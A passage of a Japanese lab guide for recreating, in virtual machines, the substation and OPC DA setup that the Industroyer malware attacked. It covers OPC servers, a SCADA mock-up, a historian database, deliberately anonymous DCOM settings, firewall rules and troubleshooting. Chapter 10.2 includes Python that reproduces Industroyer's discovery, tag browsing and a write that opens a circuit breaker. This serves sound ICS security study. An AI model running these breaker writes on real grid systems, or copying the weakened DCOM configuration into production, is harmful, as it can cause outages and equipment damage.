            iec61850.IedConnection_close(ied_conn)
            iec61850.IedConnection_destroy(ied_conn)


if __name__ == "__main__":
    main()
```

## 6.4 方法C: MatrikonOPC による簡易再現

IEC 61850 層を省略し、OPC DA の攻撃面再現に集中する方法。環境構築が最も高速。

### 手順

1. VM2 に OPC Core Components + MatrikonOPC Server for Simulation をインストール
2. MatrikonOPC Server のタグ構成を 6.3 節のタグ設計に合わせて変更
3. シミュレーションモードで Sin/Random/Constant 等のタグが自動更新される

この方法では IEC 61850 層が存在しないが、Industroyer OPC DA モジュールの動作は **OPC DA サーバに対して行われる** ため、OPC DA の攻撃面検証には十分である。

### 各方法の比較

| | 方法A (KEPServerEX) | 方法B (OSS ブリッジ) | 方法C (MatrikonOPC のみ) |
|---|---|---|---|
| **忠実度** | 最高 | 高 | 中（OPC DA 層のみ） |
| **IEC 61850 統合** | あり | あり | なし |
| **構築工数** | 低 | 高 | 最低 |
| **ライセンス** | デモ（2時間制限） | 完全無料 | 無料 |
| **推奨場面** | 統合環境を忠実に再現したい場合 | 内部構造を深く理解したい場合 | OPC DA の攻撃面にまず集中したい場合 |

---

# 第7章 SCADA / HMI の構成（Layer 2）

## 7.1 OPC DA クライアントの設定

VM3 に OPC DA クライアントをインストールし、VM2 の OPC DA サーバにリモート接続する。

### MatrikonOPC Explorer によるリモート接続

```
1. VM3 に OPC Core Components + MatrikonOPC Explorer をインストール

2. MatrikonOPC Explorer を起動
   → 左ペイン → [Remote] → ホスト名: VM2-RTUGW（または 192.168.56.20）
   → OPC サーバ一覧が表示される
   → 対象サーバ（KEPServerEX または MatrikonOPC Simulation）を右クリック → [Connect]

3. タグツリーが展開される
   → Substation.Bay1.XCBR1.Pos_stVal 等のタグが確認できる
   → 値がリアルタイムで更新されていることを確認
```

> **前提:** VM2 / VM3 双方で DCOM 設定が完了していること（第9章参照）。

### OpenOPC（Python）によるプログラム的接続

```python
import OpenOPC

opc = OpenOPC.client()
opc.connect('Kepware.KEPServerEX.V6', '192.168.56.20')

# タグの列挙（Industroyer Phase 3 に相当）
tags = opc.list('Substation.*', recursive=True)
for tag in tags:
    print(tag)

# 全タグの現在値を取得
values = opc.read(tags)
for tag, val, quality, ts in values:
    print(f"  {tag} = {val} [{quality}]")

opc.close()
```

## 7.2 Cogent DataHub による SCADA 模擬

本ワークスペースに同梱されている Cogent DataHub を SCADA / HMI の模擬として使用できる。

```
1. VM3 に DataHub をインストール（評価版 30日）
2. DataHub Manager → [OPC DA] → [Enabled]
3. [Add Server]:
     Computer: VM2-RTUGW
     Server:   Kepware.KEPServerEX.V6  (または MatrikonOPC.Simulation.1)
     Update Rate: 1000 ms
4. [Apply] → [Connect]
5. Data Viewer で全タグの値がリアルタイム表示される
```

DataHub は OPC DA ↔ OPC DA のトンネリング、Web 表示、DB 連携を単一アプリケーションで行えるため、SCADA の簡易模擬として適している。

---

# 第8章 ヒストリアンの構成（Layer 3）

## 8.1 データベースの選定と構築

### SQL Server Express のセットアップ

```sql
-- VM3 に SQL Server Express + SSMS をインストール後

CREATE DATABASE Substation_Historian;
GO

USE Substation_Historian;
GO

CREATE TABLE ProcessData (
    ID          BIGINT IDENTITY(1,1) PRIMARY KEY,
    TagName     NVARCHAR(256)  NOT NULL,
    TagValue    FLOAT          NOT NULL,
    Quality     NVARCHAR(50)   NOT NULL,
    SourceTime  DATETIME2      NOT NULL,
    InsertTime  DATETIME2      DEFAULT GETDATE()
);

CREATE INDEX IX_ProcessData_TagTime
    ON ProcessData (TagName, SourceTime);

-- 遮断器操作イベント記録用
CREATE TABLE BreakerEvents (
    ID          BIGINT IDENTITY(1,1) PRIMARY KEY,
    BreakerID   NVARCHAR(100)  NOT NULL,   -- e.g., 'XCBR1'
    OldState    INT            NOT NULL,   -- 1=Open, 2=Closed
    NewState    INT            NOT NULL,
    EventTime   DATETIME2      NOT NULL,
    Source      NVARCHAR(100)  NULL        -- 'MMS' / 'OPC_Write' / 'Unknown'
);
GO
```

### ODBC データソースの設定

```
[コントロールパネル] → [管理ツール] → [ODBC データ ソース]
→ [システム DSN] → [追加]
→ ドライバ: SQL Server Native Client
→ DSN名: Substation_Historian_DSN
→ サーバー: (local)\SQLEXPRESS
→ 認証: SQL Server 認証
→ DB: Substation_Historian
→ [テスト] → [OK]
```

## 8.2 OPC DA → DB ブリッジの設定

### Cogent DataHub による DB ロギング

```
DataHub Manager → [Database] → [Enabled]
→ [Add Connection]:
   DSN=Substation_Historian_DSN;UID=sa;PWD=<password>

→ [Logging]:
   Table: ProcessData
   Mapping:
     TagName   ← {Point Name}
     TagValue  ← {Value}
     Quality   ← {Quality}
     SourceTime ← {Timestamp}
   Interval: 1000 ms

→ [Apply]
```

### Python による直接書き込み

```python
import OpenOPC
import pyodbc
import time

opc = OpenOPC.client()
opc.connect('Kepware.KEPServerEX.V6', '192.168.56.20')

conn = pyodbc.connect('DSN=Substation_Historian_DSN;UID=sa;PWD=<password>')
cursor = conn.cursor()

TAGS = [
    'Substation.Bay1.XCBR1.Pos_stVal',
    'Substation.Measurement.PhaseA_Current',
    'Substation.Measurement.BusVoltage_kV',
    'Substation.Measurement.Frequency_Hz',
]

try:
    while True:
        for tag in TAGS:
            val, quality, ts = opc.read(tag)
            cursor.execute(
                "INSERT INTO ProcessData (TagName, TagValue, Quality, SourceTime) "
                "VALUES (?, ?, ?, ?)",
                tag, float(val), quality, ts
            )
        conn.commit()
        time.sleep(1)
except KeyboardInterrupt:
    pass
finally:
    opc.close()
    conn.close()
```

---

# 第9章 DCOM 認証環境の構成

本章では、Industroyer が活動した環境を再現するための DCOM 設定を行う。2016年当時の ICS 環境における「典型的に緩い」設定を初期状態として構成する。

## 9.1 DCOM 設定の階層構造

設定ツール: `dcomcnfg`（[スタート] → [ファイル名を指定して実行] → `dcomcnfg`）

```
コンポーネントサービス
  └── コンピュータ
       └── マイ コンピュータ
            ├── [プロパティ] ← ★ システム全体の既定値
            │    ├── [既定のプロパティ]
            │    │    ├── DCOM の有効化
            │    │    ├── 既定の認証レベル
            │    │    └── 既定の偽装レベル
            │    └── [COM セキュリティ]
            │         ├── アクセス許可（既定 / 制限）
            │         └── 起動/アクティブ化の許可（既定 / 制限）
            │
            └── [DCOM の構成]
                 └── [OPC サーバ名] ← ★ アプリ固有の上書き
                      ├── [全般] → 認証レベル
                      ├── [セキュリティ] → 起動/アクセス/構成許可
                      ├── [エンドポイント]
                      └── [ID] → 実行ユーザ
```

## 9.2 シナリオ別の設定値

以下の3シナリオを用意し、段階的に構成を変えることで、攻撃の成否と認証設定の関係を把握する。

### シナリオ 1: 匿名アクセス許可（2016年当時の典型的な ICS 環境を再現）

**想定:** OPC DA の接続トラブルを回避するため、認証を最大限に緩和した環境。Industroyer が特別なクレデンシャルなしで接続できた状態。

**VM2（RTU/ゲートウェイ）の設定:**

| 設定箇所 | 項目 | 値 |
|---|---|---|
| 既定のプロパティ | DCOM の有効化 | ON |
| 既定のプロパティ | 既定の認証レベル | **なし (None)** |
| 既定のプロパティ | 既定の偽装レベル | 識別 (Identify) |
| COM セキュリティ → アクセス許可 → 制限の編集 | Everyone | ローカル ☑ / リモート ☑ |
| COM セキュリティ → アクセス許可 → 制限の編集 | ANONYMOUS LOGON | ローカル ☑ / リモート ☑ |
| COM セキュリティ → 起動許可 → 制限の編集 | Everyone | すべて ☑ |
| COM セキュリティ → 起動許可 → 制限の編集 | ANONYMOUS LOGON | すべて ☑ |
| DCOM の構成 → [OPC サーバ] → セキュリティ | 起動/アクセス許可 | カスタマイズ → Everyone 追加 |
| DCOM の構成 → [OPC サーバ] → ID | 実行ユーザ | 対話ユーザ |

**VM3/VM4（クライアント側）の設定:**
同様に既定の認証レベルを `なし` に設定。

### シナリオ 2: ユーザ認証あり（資格情報窃取シナリオ）

**想定:** DCOM の認証は有効だが、攻撃者は事前に Active Directory 侵害によりドメインクレデンシャルを窃取済み。

**VM2（RTU/ゲートウェイ）の設定:**

| 設定箇所 | 項目 | 値 |
|---|---|---|
| 既定のプロパティ | 既定の認証レベル | **接続 (Connect)** |
| COM セキュリティ → アクセス許可 | Everyone | **削除** |
| COM セキュリティ → アクセス許可 | ANONYMOUS LOGON | **削除** |
| COM セキュリティ → アクセス許可 → 既定の編集 | 特定ユーザ（例: `OpcOperator`） | ローカル ☑ / リモート ☑ |
| COM セキュリティ → 起動許可 → 既定の編集 | 特定ユーザ（例: `OpcOperator`） | すべて ☑ |

**検証方法:**
1. VM4 から匿名で接続 → **失敗** することを確認（`0x80070005`）
2. VM4 で `OpcOperator` アカウントを使用してプロセスを実行（`runas /user:OpcOperator python attack.py`）→ **成功**
3. ワークグループ環境の場合、VM2 と VM4 の両方に同名・同パスワードのアカウントを作成する必要がある

### シナリオ 3: DCOM Hardening 適用（現代の Windows）

**想定:** CVE-2021-26414 対応として Microsoft が段階的に導入した DCOM Hardening が有効な環境。

**追加設定（Windows 10/11 の場合）:**
Windows Update（KB5004442 以降）の適用により、DCOM の認証レベルが `PKT_INTEGRITY` 以上に強制される。

確認方法:
```
reg query "HKLM\SOFTWARE\Microsoft\Ole\AppCompat" /v RequireIntegrityActivationAuthenticationLevel
```

- 値が `1`（既定）: Hardening 有効（`PKT_INTEGRITY` 未満の接続を拒否）
- 値が `0`: Hardening 無効（レガシー互換）

> **注:** フェーズ3（2023年3月以降）では、レジストリによる無効化自体が削除されている。Windows 10/11 の最新ビルドでは Hardening を無効化できない。

## 9.3 ファイアウォールとポート設計

### 必要なポートの一覧

| ポート | 用途 | 開放区間 |
|---|---|---|
| TCP 135 | DCOM RPC Endpoint Mapper | VM2 ↔ VM3, VM4 |
| TCP 5000-5020 | DCOM 動的ポート（制限後） | 同上 |
| TCP 102 | IEC 61850 MMS | VM1 ↔ VM2 |
| TCP 1433 | SQL Server | VM3 内部（ローカル） |

### DCOM 動的ポートの制限

DCOM はデフォルトで `1024-65535` の全範囲を動的ポートに使用する。以下のレジストリ設定で範囲を制限する：

```
regedit:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Internet

  Ports                   (REG_MULTI_SZ): 5000-5020
  PortsInternetAvailable  (REG_SZ):       Y
  UseInternetPorts        (REG_SZ):       Y

→ 再起動後有効
```

### Windows ファイアウォール設定

```powershell
# VM2（RTU/GW）で実行
netsh advfirewall firewall add rule name="DCOM-EPM" dir=in action=allow protocol=TCP localport=135
netsh advfirewall firewall add rule name="DCOM-Dynamic" dir=in action=allow protocol=TCP localport=5000-5020
netsh advfirewall firewall add rule name="IEC61850-MMS" dir=in action=allow protocol=TCP localport=102
```

> **Windows XP の場合:** `netsh firewall` コマンドまたは GUI（コントロールパネル → Windows ファイアウォール → 例外）で設定。

### hosts ファイルの設定

各 VM の `C:\WINDOWS\system32\drivers\etc\hosts` に以下を追記：

```
192.168.56.10  VM1-IED
192.168.56.20  VM2-RTUGW
192.168.56.30  VM3-SCADA
192.168.56.40  VM4-EWS
```

> DCOM はホスト名解決に依存する場合がある。DNS がない環境では hosts ファイルによる相互解決が必須。

---

# 第10章 環境の動作確認

## 10.1 各レイヤの疎通確認

| # | 確認項目 | 方法 | 期待結果 |
|---|---|---|---|
| 1 | ネットワーク疎通 | 全 VM 間で `ping` | 応答あり |
| 2 | IEC 61850 MMS | VM2 から VM1 に MMS クライアントで接続 | データモデルのブラウズ成功 |
| 3 | OPC DA ローカル | VM2 で OPC Explorer → ローカルサーバに接続 | タグ表示・値更新を確認 |
| 4 | OPC DA リモート | VM3/VM4 の OPC Explorer → VM2 にリモート接続 | タグ表示・値更新を確認 |
| 5 | DB 書き込み | VM3 で `SELECT * FROM ProcessData` | レコードが蓄積されている |

## 10.2 Industroyer OPC DA モジュールの動作を手動で追体験する

以下の手順は、Industroyer OPC DA モジュール（第1章 1.4節）の Phase 1〜4 を OPC Explorer および Python で再現するものである。

### Phase 1 再現: OPCEnum による探索

```python
# VM4（EWS）で実行
import OpenOPC

# OPCEnum に接続してサーバ一覧を取得
servers = OpenOPC.open_client('192.168.56.20').servers()
print("[Phase 1] Discovered OPC DA servers:")
for s in servers:
    print(f"  {s}")
```

または MatrikonOPC Explorer で [Remote] → `VM2-RTUGW` を指定 → サーバ一覧が表示される。

### Phase 2 再現: OPC DA サーバへの接続

```python
opc = OpenOPC.client()
opc.connect('Kepware.KEPServerEX.V6', '192.168.56.20')
print("[Phase 2] Connected to OPC DA server")
```

### Phase 3 再現: アドレス空間の走査

```python
# 全タグを再帰的に列挙
print("[Phase 3] Browsing address space:")
all_tags = opc.list('*', recursive=True)
for tag in all_tags:
    print(f"  {tag}")

# 遮断器関連のタグを特定
breaker_tags = [t for t in all_tags if 'XCBR' in t or 'Breaker' in t or 'Pos' in t]
print(f"\n[Phase 3] Breaker-related tags found: {len(breaker_tags)}")
for tag in breaker_tags:
    val, quality, ts = opc.read(tag)
    print(f"  {tag} = {val} [{quality}]")
```

### Phase 4 再現: 遮断器への Write

```python
# 遮断器の位置タグを読み取り
target = 'Substation.Bay1.XCBR1.Pos_stVal'
current = opc.read(target)
print(f"[Phase 4] Current breaker state: {current}")

# 遮断器を Open (1) に変更 ← Industroyer の攻撃動作
print("[Phase 4] Writing OPEN command...")
opc.write((target, 1))  # 1 = Open

# 結果確認
new_val = opc.read(target)
print(f"[Phase 4] New breaker state: {new_val}")

opc.close()
```

> **注:** 実際の Industroyer は一定間隔で Open/Close を繰り返す動作も行っていた。これは遮断器の機械的損傷を誘発する意図があったとされる。

## 10.3 Wireshark による通信解析

### DCOM 通信のキャプチャ

1. VM2 に Wireshark をインストール
2. ホストオンリーアダプタでキャプチャ開始
3. VM4 から OPC DA 接続を実行

**キャプチャフィルタ:**

| フィルタ | 用途 |
|---|---|
| `tcp.port == 135` | DCOM Endpoint Mapper の通信 |
| `dcerpc` | DCOM/RPC プロトコル全般 |
| `mms` | IEC 61850 MMS 通信（VM1 ↔ VM2 間） |

**着目点:**
- Endpoint Mapper への接続で、どの OPC サーバの CLSID が要求されたか
- 認証レベル（`auth_level` フィールド）が実際にどの値で交渉されたか
- Write 操作がどのようなパケットとして見えるか

---

# 第11章 トラブルシューティング

### 「アクセスが拒否されました」(0x80070005)

| 原因 | 対処 |
|---|---|
| DCOM アクセス許可不足 | dcomcnfg → COM セキュリティ → アクセス許可に Everyone 追加 |
| OPC サーバ固有の許可未設定 | DCOM の構成 → [OPC サーバ] → セキュリティ → カスタマイズ |
| ワークグループで NTLM 認証失敗 | 両マシンに同名・同パスワードのアカウントを作成 |
| 簡易ファイル共有が有効 (XP) | フォルダオプション → 表示 → 無効化 |

### 「RPC サーバーを利用できません」(0x800706BA)

| 原因 | 対処 |
|---|---|
| TCP 135 がブロック | ファイアウォール受信規則を追加 |
| 動的ポートがブロック | レジストリで範囲制限（5000-5020）後、FW に追加 |
| RPC サービス停止 | `services.msc` → Remote Procedure Call → 開始 |
| ネットワーク不達 | `ping` 確認。NAT モードでないか確認 |

### 「クラスが登録されていません」(0x80040154)

| 原因 | 対処 |
|---|---|
| OPC Core Components 未インストール | OPC Core Components Redistributable をインストール |
| OPC サーバ登録不良 | `regsvr32` で再登録、または再インストール |
| 32/64 bit 不一致 | 32bit サーバには 32bit クライアントを使用 |

### OPCEnum でリモートサーバが見えない

| 原因 | 対処 |
|---|---|
| OPCEnum サービス停止 | `services.msc` → OPCEnum → 開始 |
| OPCEnum 未インストール | OPC Core Components をインストール |
| TCP 135 ブロック | ファイアウォール確認 |

### 接続成功だがデータが来ない（品質 = Bad）

| 原因 | 対処 |
|---|---|
| OPC サーバのデータソース未接続 | IEC 61850 シミュレータの稼働確認 |
| ブリッジスクリプト未起動 | 方法Bの場合、bridge_script.py を起動 |
| タグパスの不一致 | OPC Explorer でタグツリーを確認 |

### チェックリスト

**ネットワーク:**
- [ ] VM 間 `ping` 疎通
- [ ] `hosts` ファイル設定
- [ ] ネットワークアダプタ種類（ホストオンリー or ブリッジ、NAT は不可）

**DCOM:**
- [ ] `dcomcnfg` で DCOM 有効化
- [ ] 認証レベル設定
- [ ] アクセス許可 / 起動許可の ACL
- [ ] OPC サーバ固有設定

**OPC:**
- [ ] OPC Core Components インストール済み
- [ ] OPC サーバプロセス稼働中
- [ ] OPCEnum サービス起動
- [ ] ローカル接続テスト成功

**データソース:**
- [ ] IEC 61850 シミュレータ稼働中（方法A/B）
- [ ] ブリッジスクリプト稼働中（方法B）
- [ ] MMS 通信確立（Wireshark で確認）

**ファイアウォール:**
- [ ] TCP 135 開放
- [ ] DCOM 動的ポート範囲開放
- [ ] TCP 102 開放（IEC 61850 使用時）

---

# 付録

## A. 用語集

| 用語 | 説明 |
|---|---|
| **OPC DA** | OPC Data Access。COM/DCOM ベースのリアルタイムデータアクセス仕様 |
| **OPC UA** | OPC Unified Architecture。プラットフォーム非依存の次世代 OPC 標準（IEC 62541） |
| **COM** | Component Object Model。Windows のバイナリコンポーネント連携技術 |
| **DCOM** | Distributed COM。COM をネットワーク越しに拡張した RPC ベースの分散オブジェクト技術 |
| **OPCEnum** | OPC Foundation 提供のシステムサービス。ローカルの OPC サーバ一覧をリモートに提供 |
| **ProgID** | Programmatic Identifier。COM オブジェクトの人間可読な識別子（例: `Kepware.KEPServerEX.V6`） |
| **CLSID** | Class Identifier。COM オブジェクトの GUID 識別子 |
| **IEC 61850** | 変電所通信の国際標準規格 |
| **MMS** | Manufacturing Message Specification。IEC 61850 のアプリケーション層プロトコル（ISO 9506） |
| **IED** | Intelligent Electronic Device。変電所の保護・制御装置（保護リレー等） |
| **RTU** | Remote Terminal Unit。遠方監視制御装置 |
| **SCADA** | Supervisory Control and Data Acquisition。監視制御システム |
| **HMI** | Human-Machine Interface。操作画面 |
| **EWS** | Engineering Workstation。制御ロジックの設定・保守に使用する端末 |
| **XCBR** | IEC 61850 論理ノード。Circuit Breaker（遮断器）を表す |
| **XSWI** | IEC 61850 論理ノード。Disconnector / Switch（断路器）を表す |
| **MMXU** | IEC 61850 論理ノード。Measurement Unit（計測ユニット）を表す |
| **SCL** | Substation Configuration Language。IEC 61850 の構成記述言語（XML ベース） |
| **Industroyer** | 2016年ウクライナ変電所攻撃に使用されたマルウェア。別名 CrashOverride |
| **Sandworm** | ロシア GRU（軍参謀本部情報総局）Unit 74455 に帰属する APT グループ |
| **DCOM Hardening** | CVE-2021-26414 対応として Microsoft が導入した DCOM 認証要件の段階的強化 |

## B. 参考文献

### Industroyer 解析レポート

| # | 資料 | 発行元 | URL / 備考 |
|---|---|---|---|
| 1 | "WIN32/INDUSTROYER: A new threat for industrial control systems" (2017) | ESET | https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf |
| 2 | "CRASHOVERRIDE: Analysis of the Threat to Electric Grid Operations" (2017) | Dragos | https://dragos.com/blog/crashoverride/ |
| 3 | "Industroyer2: Industroyer reloaded" (2022) | ESET | https://www.welivesecurity.com/2022/04/12/industroyer2-industroyer-reloaded/ |
| 4 | "Alert (AA23-059A): CRASHOVERRIDE" | CISA | https://www.cisa.gov/ |


### ソフトウェア

| # | ソフトウェア | URL |
|---|---|---|
| 11 | libIEC61850 | https://github.com/mz-automation/libiec61850 |
| 12 | KEPServerEX (PTC/Kepware) | https://www.kepware.com/ |
| 13 | MatrikonOPC | https://www.matrikonopc.com/ |
| 14 | OpenOPC | https://openopc2.readthedocs.io/ |
| 15 | Cogent DataHub | 本ワークスペース同梱 |
| 16 | Wireshark | https://www.wireshark.org/ |

---

> **改訂履歴**
>
> | 版数 | 日付 | 内容 |
> |---|---|---|
> | 第1版 | 2026-07-11 | 初版作成（OPC 導入ガイドとして） |
> | 第2版 | 2026-07-12 | Industroyer 攻撃対象環境の仮想再現に焦点を移して全面改訂 |
